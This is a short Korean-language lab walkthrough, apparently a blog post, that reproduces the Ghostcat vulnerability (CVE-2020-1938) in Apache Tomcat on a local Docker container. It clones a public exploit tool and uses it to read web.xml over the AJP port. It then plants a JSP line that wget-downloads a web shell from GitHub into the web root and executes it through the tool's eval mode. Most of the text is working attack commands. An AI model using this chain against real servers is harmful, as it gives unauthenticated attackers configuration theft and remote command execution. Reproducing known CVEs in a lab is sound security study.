CVE-2020-1938 Ghostcat 취약점

영향받는 Tomcat 제품 버전
Apache Tomcat 9.x < 9.0.31
Apache Tomcat 8.x < 8.5.51
Apache Tomcat 7.x < 7.0.100
Apache Tomcat 6.x

 * 도커에 Tomcat 설치
docker run -p 8080:8080 -p 8009:8009 -d --name tc --rm tomcat:9.0.29

ajp://127.0.0.1:8009

 * 공격코드 다운로드
git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487

 * 공격코드 테스트
python3 ajpShooter.py http://127.0.0.1 8009 /WEB-INF/web.xml read //웹에 설정파일을 읽을 수 있는지 테스트

  #jsp web shell single line
  

 * 취약점 공격 코드 업로드 - a.txt 파일 생성하고 웹쉘코드 삽입
<% Runtime.getRuntime().exec("wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp -O webapps/ROOT/cmd.jsp"); %>

docker cp a.txt tc:/usr/local/tomcat/webapps/ROOT //컨테이너에 파일 복사 테스트 
python3 ajpShooter.py http://127.0.0.1 8009 /a.txt read // 복사한 파일 읽기 

python3 ajpShooter.py http://127.0.0.1 8009 /a.txt eval //업로드됨 


결론
인증되지 않은 사용자의 권한으로 매우 민감한 설정을 건드릴 수 있기에 벌어지는 현상이다.

유사 취약점
cve 2012-1823
https://operatingsystems.tistory.com/entry/Vul-CVE20121823-Vulnerability.












